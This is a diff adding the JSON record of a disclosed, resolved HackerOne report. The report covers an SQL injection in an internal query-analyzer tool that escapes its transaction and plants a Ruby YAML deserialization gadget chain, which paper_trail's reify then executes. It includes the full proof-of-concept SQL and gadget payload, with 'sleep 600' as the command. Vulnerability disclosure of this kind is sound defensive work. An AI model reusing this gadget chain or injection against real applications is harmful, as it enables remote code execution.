@@ -1,0 +1,136 @@
+{
+  "id": 1663299,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjYzMjk5",
+  "url": "https://hackerone.com/reports/1663299",
+  "title": "Ability to escape database transaction through SQL injection, leading to arbitrary code execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-08T20:20:37.498Z",
+  "submitted_at": "2022-08-08T20:20:37.685Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-08-09T18:58:36.634Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-08-09T18:15:28.298Z",
+  "team_member_agreed_on_going_public_at": "2022-08-09T18:58:36.438Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "HackerOne has an internal backend interface that gives debugging capabilities to its engineers. One of the features is the ability to run `EXPLAIN ANALYZE` queries against a connected database. This feature is accessible by a handful of engineers. The feature is vulnerable to a SQL injection that allows an attacker to escape the transaction that is wrapped around the `EXPLAIN ANALYZE` query. This SQL injection can be leveraged to execute arbitrary ruby on an application server.\n\nThis vulnerability will be demonstrated against a local development environment.\n\n# Proof of concept\n- go to http://localhost:8080/support/sql_query_analyzer\n- analyze the following query using the `public` database connection:\n\n```sql\nSELECT\n        1\n;\n\nROLLBACK\n;\n\nINSERT\n    INTO\n        user_versions (\n            item_type\n            ,item_id\n            ,event\n            ,email\n            ,object\n        )\n    VALUES (\n        'User'\n        ,2\n        ,'update'\n        , 'uniquekeywordtotriggercode@hackerone.com'\n        ,'---\nusername:\n  - !ruby/object:Gem::Installer\n      i: x\n  - !ruby/object:Gem::SpecFetcher\n      i: y\n  - !ruby/object:Gem::Requirement\n    requirements:\n      !ruby/object:Gem::Package::TarReader\n      io: &1 !ruby/object:Net::BufferedIO\n        io: &1 !ruby/object:Gem::Package::TarReader::Entry\n            read: 0\n            header: \"abc\"\n        debug_output: &1 !ruby/object:Net::WriteAdapter\n            socket: &1 !ruby/object:Gem::RequestSet\n                sets: !ruby/object:Net::WriteAdapter\n                    socket: !ruby/module ''Kernel''\n                    method_id: :system\n                git_set: sleep 600\n            method_id: :resolve '\n    )\n;\n\n-- \n```\n- visit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com and observe that the page will hang for 600 seconds and then result in a 500 internal server error, proving that it executes the `sleep 600` command in the injected object.\n\n# Root cause\nThe following Ruby code is used to execute the `EXPLAIN ANALYZE` query:\n\n```ruby\n# ...\nexplain_analyze = \"EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) #{raw_sql}\"\n\nbegin\n  conn.transaction(requires_new: true) do\n    block = proc do\n      analyze_result = conn.protected_attribute.with_parameters(params) do\n        conn.execute explain_analyze\n      end\n\n      fail ActiveRecord::Rollback\n    end\n\n    if config[:use_protected_schema]\n      ProtectedAttribute::SchemaUtility.with_requester(user) do\n        block.call\n      end\n    else\n      block.call\n    end\n# ...\n```\n\nThe code is written so that it would wrap each analyze query in a transaction. This avoids permanent side effects of running the query, because `EXPLAIN ANALYZE` will still execute the SQL query. The interpolation of the `raw_sql` variable can be used to escape the current transactions and make any changes persist. The following part is used to jump out of the transaction:\n\n```sql\nSELECT\n        1\n;\n\nROLLBACK\n;\n```\n\nThen, a payload is injected into a table called `user_versions` and a comment identifier (`-- `) is used to block the `ROLLBACK` statement that is appended by the `transaction` block. The `user_versions` table keeps a paper trail of changes on `User` objects. For example, when someone changes their username, the application keeps a snapshot of the previous object in the `user_versions` table. HackerOne uses a gem called [paper_trail](https://github.com/paper-trail-gem/paper_trail) for this. This gem comes with a useful function to reinstantiate an old version of an object, called `reify`. When this method is called, the YAML from the `object` attribute is deseriealized and is used to initialize the class stored in the `item_type` column. This method inherently trusts the object stored in `object` however. Because the attacker can persist a new version, it can control the object that would be deserialized. In the past, multiple YAML deserialization techniques have been published. For the proof of concept, I reused [Stratum Security's](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) payload from 2021.\n\nThere is only one place where the `reify` method is called on a `UserVersion` object, and it's through the historic users feature. It's using the following code:\n\n```ruby\ndef index\n  if params[:historic_user_input].present?\n    if params[:historic_user_input].include? '@'\n      versions = UserVersion.where(email: params[:historic_user_input]).order(id: :asc).to_a\n      current_owner = User.find_by(email: params[:historic_user_input])\n    else\n      # ...\n    end\n\n    # ...\n\n    original_user = versions.first.reify\n```\n\nThis code will pull all `UserVersion` objects based on the `email` attribute and sorts them based on the primary key ascending. Because we also can control the `email` attribute through the SQL injection, we need to simply persist a version with a value that is unique in the table, such as `uniquekeywordtotriggercode@hackerone.com`. When the page is loaded with that as the value for the `historic_user_input`, it will only return our injected object and reinstantiate it, leading to the execution of arbitrary ruby code or, in this case, a command.\n\n## Impact\n\nExecution of arbitrary ruby code.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-09-08T18:15:28.539Z",
+  "allow_singular_disclosure_after": -115678491.24334165,
+  "singular_disclosure_allowed": true,
+  "vote_count": 29,
+  "voters": [
+    "jjjjjjjjjjjjjjjjjjjjjjjj",
+    "pmnh",
+    "jensec",
+    "drsniper",
+    "alp",
+    "thruster",
+    "zy9ard3",
+    "shreyaschavhan",
+    "jobert",
+    "tess",
+    "and 19 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
